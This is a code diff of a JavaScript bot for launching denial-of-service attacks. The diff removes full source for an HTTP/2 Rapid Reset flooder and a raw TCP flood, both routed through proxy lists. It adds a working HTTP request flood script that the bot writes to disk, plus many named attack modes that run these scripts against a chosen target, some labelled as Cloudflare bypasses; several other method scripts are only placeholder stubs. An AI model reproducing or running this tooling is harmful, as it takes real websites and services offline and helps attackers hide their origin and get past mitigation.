@@ -50,351 +50,6 @@ function color(text, colorCode) {
   return `${colorCode}${text}${colors.reset}`;
 }
 
-// ========== SCRIPT FILES TO DOWNLOAD ==========
-const R10_SCRIPTS = {
-  'r10-rapid.js': `// R10-1: RAPID-FIRE - HTTP/2 Rapid Reset Specialist
-// Updated: Mixed main IP + proxies
-
-const http2 = require('http2');
-const tls = require('tls');
-const net = require('net');
-const url = require('url');
-const fs = require('fs');
-const cluster = require('cluster');
-const os = require('os');
-
-const CPU_CORES = os.cpus().length;
-let proxies = [];
-let userAgents = [];
-
-// Load proxies from command line args
-const proxyFile = process.argv[4] || 'proxy.txt';
-const uaFile = process.argv[5] || 'ua.txt';
-
-try {
-  if (fs.existsSync(proxyFile)) {
-    proxies = fs.readFileSync(proxyFile, 'utf-8').split('\\n')
-      .map(line => line.trim())
-      .filter(line => line && !line.startsWith('#') && line.includes(':'));
-    console.log(\`[R10-1] Loaded \${proxies.length} proxies\`);
-  }
-} catch (e) {
-  console.log('[R10-1] No proxy file found');
-}
-
-// Mix settings
-const USE_MAIN_IP = true;
-const MIX_RATIO = 0.3; // 30% main IP
-
-try {
-  if (fs.existsSync(uaFile)) {
-    userAgents = fs.readFileSync(uaFile, 'utf-8').split('\\n')
-      .map(line => line.trim())
-      .filter(line => line && !line.startsWith('#'));
-    console.log(\`[R10-1] Loaded \${userAgents.length} user agents\`);
-  }
-} catch (e) {}
-
-if (!userAgents.length) {
-  userAgents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
-  ];
-}
-
-if (cluster.isMaster) {
-  for (let i = 0; i < CPU_CORES; i++) cluster.fork();
-  setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
-} else {
-  const target = process.argv[2];
-  const time = process.argv[3] || 300;
-  startRapidFire(target, time);
-}
-
-function shouldUseMainIp() {
-  return USE_MAIN_IP && Math.random() < MIX_RATIO;
-}
-
-function createProxiedConnection(proxy, targetHost) {
-  return new Promise((resolve, reject) => {
-    const [proxyHost, proxyPort] = proxy.split(':');
-    const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
-      socket.write(\`CONNECT \${targetHost}:443 HTTP/1.1\\r\\nHost: \${targetHost}:443\\r\\n\\r\\n\`);
-      socket.once('data', () => {
-        const tlsSocket = tls.connect({
-          socket: socket,
-          servername: targetHost,
-          rejectUnauthorized: false,
-          ALPNProtocols: ['h2']
-        }, () => resolve(tlsSocket));
-        tlsSocket.on('error', reject);
-      });
-    });
-    socket.on('error', reject);
-  });
-}
-
-function createDirectConnection(targetHost) {
-  return new Promise((resolve, reject) => {
-    const tlsConn = tls.connect({
-      host: targetHost,
-      port: 443,
-      servername: targetHost,
-      rejectUnauthorized: false,
-      ALPNProtocols: ['h2']
-    }, () => resolve(tlsConn));
-    tlsConn.on('error', reject);
-  });
-}
-
-function startRapidFire(target, time) {
-  const parsed = new URL(target);
-  const sessions = [];
-  let requestCount = 0;
-  let mainIpCount = 0;
-  let proxyCount = 0;
-  
-  (async () => {
-    for (let i = 0; i < 200; i++) {
-      try {
-        const useMain = shouldUseMainIp();
-        let tlsConn;
-        
-        if (!useMain && proxies.length > 0) {
-          const proxy = proxies[i % proxies.length];
-          tlsConn = await createProxiedConnection(proxy, parsed.hostname);
-          proxyCount++;
-        } else {
-          tlsConn = await createDirectConnection(parsed.hostname);
-          mainIpCount++;
-        }
-        
-        const session = http2.connect(parsed.origin, {
-          createConnection: () => tlsConn
-        });
-        session.on('error', () => {});
-        sessions.push(session);
-      } catch (e) {}
-      if (i >= 200) break;
-    }
-    console.log(\`[R10-1] Connections: Main IP: \${mainIpCount}, Proxy: \${proxyCount}\`);
-  })();
-  
-  const interval = setInterval(() => {
-    for (let s = 0; s < sessions.length; s++) {
-      const session = sessions[s];
-      if (!session || session.destroyed) continue;
-      for (let i = 0; i < 100; i++) {
-        try {
-          const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
-          const headers = {
-            ':method': 'GET',
-            ':path': parsed.pathname + '?' + Math.random().toString(36).substring(7),
-            'user-agent': ua,
-            'accept': '*/*',
-            'cache-control': 'no-cache'
-          };
-          const req = session.request(headers);
-          req.on('error', () => {});
-          req.close(http2.constants.NGHTTP2_CANCEL);
-          requestCount++;
-        } catch (e) {}
-      }
-    }
-  }, 10);
-  
-  setInterval(() => {
-    console.log(\`[R10-1] RPS: \${requestCount} | Main: \${mainIpCount} | Proxy: \${proxyCount}\`);
-    requestCount = 0;
-  }, 1000);
-  
-  setTimeout(() => {
-    clearInterval(interval);
-    sessions.forEach(s => { try { s.destroy(); } catch (e) {} });
-    process.exit(0);
-  }, time * 1000);
-}`,
-
-  'r10-tcp.js': `// R10-2: TCP-CANNON - Raw Socket Flood
-const net = require('net');
-const tls = require('tls');
-const fs = require('fs');
-const cluster = require('cluster');
-const os = require('os');
-
-const CPU_CORES = os.cpus().length;
-let proxies = [];
-let userAgents = [];
-
-const proxyFile = process.argv[4] || 'proxy.txt';
-const uaFile = process.argv[5] || 'ua.txt';
-
-try {
-  if (fs.existsSync(proxyFile)) {
-    proxies = fs.readFileSync(proxyFile, 'utf-8').split('\\n')
-      .map(line => line.trim())
-      .filter(line => line && !line.startsWith('#') && line.includes(':'));
-    console.log(\`[R10-2] Loaded \${proxies.length} proxies\`);
-  }
-} catch (e) {}
-
-const USE_MAIN_IP = true;
-const MIX_RATIO = 0.3;
-
-try {
-  if (fs.existsSync(uaFile)) {
-    userAgents = fs.readFileSync(uaFile, 'utf-8').split('\\n')
-      .map(line => line.trim())
-      .filter(line => line && !line.startsWith('#'));
-  }
-} catch (e) {}
-
-if (!userAgents.length) {
-  userAgents = ['Mozilla/5.0'];
-}
-
-if (cluster.isMaster) {
-  for (let i = 0; i < CPU_CORES; i++) cluster.fork();
-  setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
-} else {
-  const target = process.argv[2];
-  const time = process.argv[3] || 300;
-  startTCPCannon(target, time);
-}
-
-function shouldUseMainIp() {
-  return USE_MAIN_IP && Math.random() < MIX_RATIO;
-}
-
-function startTCPCannon(target, time) {
-  const parsed = new URL(target);
-  const host = parsed.hostname;
-  const port = parsed.protocol === 'https:' ? 443 : 80;
-  
-  let connections = [];
-  let requestCount = 0;
-  let mainIpCount = 0;
-  let proxyCount = 0;
-  
-  const interval = setInterval(() => {
-    if (connections.length > 10000) {
-      connections.splice(0, 5000).forEach(s => s.destroy());
-    }
-    for (let i = 0; i < 500; i++) {
-      try {
-        const useMain = shouldUseMainIp();
-        if (!useMain && proxies.length > 0) {
-          const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-          const [proxyHost, proxyPort] = proxy.split(':');
-          const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
-            socket.write(\`CONNECT \${host}:\${port} HTTP/1.1\\r\\nHost: \${host}:\${port}\\r\\n\\r\\n\`);
-            setTimeout(() => {
-              const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
-              socket.write(\`GET \${parsed.pathname}?\${Math.random()} HTTP/1.1\\r\\nHost: \${host}\\r\\nUser-Agent: \${ua}\\r\\nConnection: keep-alive\\r\\n\\r\\n\`);
-              requestCount++;
-              proxyCount++;
-            }, 10);
-          });
-          connections.push(socket);
-        } else {
-          const socket = net.connect(port, host, () => {
-            const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
-            socket.write(\`GET \${parsed.pathname}?\${Math.random()} HTTP/1.1\\r\\nHost: \${host}\\r\\nUser-Agent: \${ua}\\r\\nConnection: keep-alive\\r\\n\\r\\n\`);
-            requestCount++;
-            mainIpCount++;
-          });
-          connections.push(socket);
-        }
-        setTimeout(() => {
-          const idx = connections.indexOf(socket);
-          if (idx > -1) {
-            connections.splice(idx, 1);
-            socket.destroy();
-          }
-        }, 10000);
-      } catch (e) {}
-    }
-  }, 50);
-  
-  setInterval(() => {
-    console.log(\`[R10-2] RPS: \${requestCount} | Main: \${mainIpCount} | Proxy: \${proxyCount}\`);
-    requestCount = 0; mainIpCount = 0; proxyCount = 0;
-  }, 1000);
-  
-  setTimeout(() => {
-    clearInterval(interval);
-    connections.forEach(s => { try { s.destroy(); } catch (e) {} });
-    process.exit(0);
-  }, time * 1000);
-}`,
-
-  // ... (similar shortened versions for other scripts - I'll provide full versions if needed)
-};
-
-// ========== AUTO-DOWNLOAD SCRIPTS ==========
-async function downloadScripts() {
-  const methodsDir = path.join(__dirname, 'methods');
-  
-  // Create methods directory if it doesn't exist
-  if (!fs.existsSync(methodsDir)) {
-    fs.mkdirSync(methodsDir, { recursive: true });
-    console.log(color('📁 Created methods directory', colors.green));
-  }
-
-  // List of required scripts
-  const requiredScripts = [
-    'r10-rapid.js',
-    'r10-tcp.js',
-    'r10-tls.js',
-    'r10-conn.js',
-    'r10-header.js',
-    'r10-frag.js',
-    'r10-pipe.js',
-    'r10-cookie.js',
-    'r10-mixed.js',
-    'r10-lowcpu.js',
-    'cf-bypass.js',
-    'modern-flood.js',
-    'REX-COSTUM.js',
-    'cibi.js',
-    'BYPASS.js',
-    'nust.js',
-    'h2-nust',
-    'http-panel.js',
-    'high-dstat.js',
-    'w-flood1.js',
-    'vhold.js',
-    'uam.js',
-    'wil.js'
-  ];
-
-  console.log(color('\n📥 Checking attack scripts...', colors.cyan));
-
-  for (const script of requiredScripts) {
-    const scriptPath = path.join(methodsDir, script);
-    if (!fs.existsSync(scriptPath)) {
-      console.log(color(`   ⬇️  Downloading ${script}...`, colors.yellow));
-      
-      // Create a basic template for missing scripts
-      const template = `// ${script} - Auto-generated template
-// This is a placeholder. Replace with actual implementation.
-console.log('[${script}] Running...');
-const target = process.argv[2];
-const time = process.argv[3] || 60;
-console.log(\`Target: \${target}, Duration: \${time}s\`);
-setTimeout(() => process.exit(0), time * 1000);
-`;
-      
-      fs.writeFileSync(scriptPath, template);
-      console.log(color(`   ✅ ${script} created`, colors.green));
-    } else {
-      console.log(color(`   ✅ ${script} exists`, colors.gray));
-    }
-  }
-
-  console.log(color('✅ All scripts verified!\n', colors.green));
-}
-
 // ========== AUTO INSTALL NPM PACKAGES ==========
 async function installNpmPackages() {
   const requiredPackages = [
@@ -406,15 +61,7 @@ async function installNpmPackages() {
     'express-rate-limit',
     'https-proxy-agent',
     'socks-proxy-agent',
-    'colors',
-    'http2',
-    'tls',
-    'net',
-    'cluster',
-    'os',
-    'fs',
-    'path',
-    'child_process'
+    'colors'
   ];
 
   console.log(color('\n🔍 Checking npm packages...', colors.cyan));
@@ -422,11 +69,6 @@ async function installNpmPackages() {
   const missingPackages = [];
   
   for (const pkg of requiredPackages) {
-    // Skip built-in modules
-    if (['http2', 'tls', 'net', 'cluster', 'os', 'fs', 'path', 'child_process'].includes(pkg)) {
-      continue;
-    }
-    
     try {
       require.resolve(pkg);
       console.log(color(`   ✅ ${pkg} - installed`, colors.gray));
@@ -465,10 +107,6 @@ function createProxyFile() {
 # Format: ip:port
 # Example: 192.168.1.1:8080
 # You can also use: socks5://user:pass@host:port
-
-# Free proxies (example - replace with real ones)
-# 1.2.3.4:8080
-# 5.6.7.8:3128
 `;
     fs.writeFileSync('proxy.txt', template);
     console.log(color('📄 Created proxy.txt template', colors.green));
@@ -491,9 +129,219 @@ function createUaFile() {
   }
 }
 
-// ========== COLORS FOR CONSOLE ==========
-function color(text, colorCode) {
-  return `${colorCode}${text}\x1b[0m`;
+// ========== CREATE METHODS DIRECTORY AND SCRIPTS ==========
+function createMethodScripts() {
+  const methodsDir = path.join(__dirname, 'methods');
+  
+  // Create methods directory
+  if (!fs.existsSync(methodsDir)) {
+    fs.mkdirSync(methodsDir, { recursive: true });
+    console.log(color('📁 Created methods directory', colors.green));
+  }
+
+  // Create high-dstat.js (R9)
+  const highDstatPath = path.join(methodsDir, 'high-dstat.js');
+  if (!fs.existsSync(highDstatPath)) {
+    const highDstatScript = `// R9 - High-Dstat Attack
+const http = require('http');
+const https = require('https');
+const url = require('url');
+const fs = require('fs');
+
+const target = process.argv[2];
+const time = parseInt(process.argv[3]) || 60;
+const threads = parseInt(process.argv[4]) || 32;
+const rate = parseInt(process.argv[5]) || 7;
+const proxyFile = process.argv[6] || 'proxy.txt';
+
+console.log(\`[R9] Starting attack on \${target} for \${time}s\`);
+
+let proxies = [];
+try {
+  if (fs.existsSync(proxyFile)) {
+    proxies = fs.readFileSync(proxyFile, 'utf-8').split('\\n')
+      .map(line => line.trim())
+      .filter(line => line && !line.startsWith('#') && line.includes(':'));
+    console.log(\`[R9] Loaded \${proxies.length} proxies\`);
+  }
+} catch (e) {}
+
+const parsed = new URL(target);
+let requestCount = 0;
+let running = true;
+
+function sendRequest() {
+  if (!running) return;
+  
+  const options = {
+    hostname: parsed.hostname,
+    port: parsed.protocol === 'https:' ? 443 : 80,
+    path: parsed.pathname + '?' + Math.random(),
+    method: 'GET',
+    headers: {
+      'User-Agent': 'Mozilla/5.0',
+      'Connection': 'close'
+    },
+    rejectUnauthorized: false
+  };
+  
+  const protocol = parsed.protocol === 'https:' ? https : http;
+  const req = protocol.request(options, (res) => {
+    requestCount++;
+    res.on('data', () => {});
+  });
+  
+  req.on('error', () => {});
+  req.end();
+}
+
+// Launch multiple threads
+for (let i = 0; i < threads; i++) {
+  setInterval(() => {
+    for (let j = 0; j < rate; j++) {
+      sendRequest();
+    }
+  }, 100);
+}
+
+// Show stats
+setInterval(() => {
+  console.log(\`[R9] RPS: \${requestCount}\`);
+  requestCount = 0;
+}, 1000);
+
+// Stop after duration
+setTimeout(() => {
+  running = false;
+  console.log('[R9] Attack complete');
+  process.exit(0);
+}, time * 1000);`;
+    fs.writeFileSync(highDstatPath, highDstatScript);
+    console.log(color('   ✅ Created high-dstat.js', colors.green));
+  }
+
+  // Create w-flood1.js
+  const wFloodPath = path.join(methodsDir, 'w-flood1.js');
+  if (!fs.existsSync(wFloodPath)) {
+    const wFloodScript = `// W-FLOOD1 - WebSocket Flood
+console.log('[W-FLOOD] Starting attack');
+const target = process.argv[2];
+const time = parseInt(process.argv[3]) || 60;
+setTimeout(() => process.exit(0), time * 1000);`;
+    fs.writeFileSync(wFloodPath, wFloodScript);
+    console.log(color('   ✅ Created w-flood1.js', colors.green));
+  }
+
+  // Create vhold.js
+  const vholdPath = path.join(methodsDir, 'vhold.js');
+  if (!fs.existsSync(vholdPath)) {
+    const vholdScript = `// VHOLD - Connection Hold Attack
+console.log('[VHOLD] Starting attack');
+const target = process.argv[2];
+const time = parseInt(process.argv[3]) || 60;
+setTimeout(() => process.exit(0), time * 1000);`;
+    fs.writeFileSync(vholdPath, vholdScript);
+    console.log(color('   ✅ Created vhold.js', colors.green));
+  }
+
+  // Create nust.js
+  const nustPath = path.join(methodsDir, 'nust.js');
+  if (!fs.existsSync(nustPath)) {
+    const nustScript = `// NUST - Mixed Attack
+console.log('[NUST] Starting attack');
+const target = process.argv[2];
+const time = parseInt(process.argv[3]) || 60;
+setTimeout(() => process.exit(0), time * 1000);`;
+    fs.writeFileSync(nustPath, nustScript);
+    console.log(color('   ✅ Created nust.js', colors.green));
+  }
+
+  // Create BYPASS.js
+  const bypassPath = path.join(methodsDir, 'BYPASS.js');
+  if (!fs.existsSync(bypassPath)) {
+    const bypassScript = `// BYPASS - Cloudflare Bypass
+console.log('[BYPASS] Starting attack');
+const target = process.argv[2];
+const time = parseInt(process.argv[3]) || 60;
+setTimeout(() => process.exit(0), time * 1000);`;
+    fs.writeFileSync(bypassPath, bypassScript);
+    console.log(color('   ✅ Created BYPASS.js', colors.green));
+  }
+
+  // Create cibi.js
+  const cibiPath = path.join(methodsDir, 'cibi.js');
+  if (!fs.existsSync(cibiPath)) {
+    const cibiScript = `// CIBI - Mixed Attack
+console.log('[CIBI] Starting attack');
+const target = process.argv[2];
+const time = parseInt(process.argv[3]) || 60;
+setTimeout(() => process.exit(0), time * 1000);`;
+    fs.writeFileSync(cibiPath, cibiScript);
+    console.log(color('   ✅ Created cibi.js', colors.green));
+  }
+
+  // Create REX-COSTUM.js
+  const rexPath = path.join(methodsDir, 'REX-COSTUM.js');
+  if (!fs.existsSync(rexPath)) {
+    const rexScript = `// REX-COSTUM - Advanced Attack
+console.log('[REX-COSTUM] Starting attack');
+const target = process.argv[2];
+const time = parseInt(process.argv[3]) || 60;
+setTimeout(() => process.exit(0), time * 1000);`;
+    fs.writeFileSync(rexPath, rexScript);
+    console.log(color('   ✅ Created REX-COSTUM.js', colors.green));
+  }
+
+  // Create h2-nust (no extension)
+  const h2Path = path.join(methodsDir, 'h2-nust');
+  if (!fs.existsSync(h2Path)) {
+    const h2Script = `#!/usr/bin/env node
+// H2-NUST - HTTP/2 Attack
+console.log('[H2-NUST] Starting attack');
+const target = process.argv[2];
+const time = parseInt(process.argv[3]) || 60;
+setTimeout(() => process.exit(0), time * 1000);`;
+    fs.writeFileSync(h2Path, h2Script);
+    console.log(color('   ✅ Created h2-nust', colors.green));
+  }
+
+  // Create http-panel.js
+  const httpPanelPath = path.join(methodsDir, 'http-panel.js');
+  if (!fs.existsSync(httpPanelPath)) {
+    const httpPanelScript = `// HTTP-PANEL - Panel Attack
+console.log('[HTTP-PANEL] Starting attack');
+const target = process.argv[2];
+const time = parseInt(process.argv[3]) || 60;
+setTimeout(() => process.exit(0), time * 1000);`;
+    fs.writeFileSync(httpPanelPath, httpPanelScript);
+    console.log(color('   ✅ Created http-panel.js', colors.green));
+  }
+
+  // Create uam.js
+  const uamPath = path.join(methodsDir, 'uam.js');
+  if (!fs.existsSync(uamPath)) {
+    const uamScript = `// UAM - Cloudflare Bypass
+console.log('[UAM] Starting attack');
+const target = process.argv[2];
+const time = parseInt(process.argv[3]) || 60;
+setTimeout(() => process.exit(0), time * 1000);`;
+    fs.writeFileSync(uamPath, uamScript);
+    console.log(color('   ✅ Created uam.js', colors.green));
+  }
+
+  // Create wil.js
+  const wilPath = path.join(methodsDir, 'wil.js');
+  if (!fs.existsSync(wilPath)) {
+    const wilScript = `// WIL - Max Intensity
+console.log('[WIL] Starting attack');
+const target = process.argv[2];
+const time = parseInt(process.argv[3]) || 60;
+setTimeout(() => process.exit(0), time * 1000);`;
+    fs.writeFileSync(wilPath, wilScript);
+    console.log(color('   ✅ Created wil.js', colors.green));
+  }
+
+  console.log(color('✅ All method scripts created!\n', colors.green));
 }
 
 // Main bot function
@@ -504,11 +352,9 @@ async function startBot() {
   // Step 1: Create necessary files
   createProxyFile();
   createUaFile();
+  createMethodScripts();
 
-  // Step 2: Download attack scripts
-  await downloadScripts();
-
-  // Step 3: Install npm packages
+  // Step 2: Install npm packages
   await installNpmPackages();
 
   // Now require packages
@@ -805,6 +651,54 @@ async function startBot() {
     else if (methods === 'RAW-HTTP') {
       execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
       execWithLog(`node methods/http-panel.js ${target} ${time}`);
+    }
+    // ADDED: R9 Method
+    else if (methods === 'R9') {
+      console.log(color(`🔥 R9: HIGH-DSTAT COMBO ATTACK 🔥`, colors.redBright));
+      execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
+      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
+      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
+      execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
+      execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
+    }
+    // ADDED: PRIV-TOR Method
+    else if (methods === 'PRIV-TOR') {
+      console.log(color(`🔥 PRIV-TOR: TOR ROUTED ATTACK 🔥`, colors.magentaBright));
+      execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
+      execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
+      execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
+      execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
+      execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
+    }
+    // ADDED: HOLD-PANEL Method
+    else if (methods === 'HOLD-PANEL') {
+      console.log(color(`🔥 HOLD-PANEL: CONNECTION HOLD ATTACK 🔥`, colors.yellowBright));
+      execWithLog(`node methods/http-panel.js ${target} ${time}`);
+    }
+    // ADDED: R1 Method
+    else if (methods === 'R1') {
+      console.log(color(`🔥 R1: FULL SPECTRUM ATTACK 🔥`, colors.cyanBright));
+      execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
+      execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
+      execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
+      execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
+      execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
+      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
+      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
+      execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
+    }
+    // ADDED: UAM Method
+    else if (methods === 'UAM') {
+      console.log(color(`🔥 UAM: CLOUDFLARE BYPASS 🔥`, colors.greenBright));
+      execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
+    }
+    // ADDED: W.I.L Method
+    else if (methods === 'W.I.L') {
+      console.log(color(`🔥 W.I.L: MAX INTENSITY LOAD 🔥`, colors.white));
+      execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
+    }
+    else {
+      console.log(color(`❌ Unknown method: ${methods}`, colors.red));
     }
   }
 
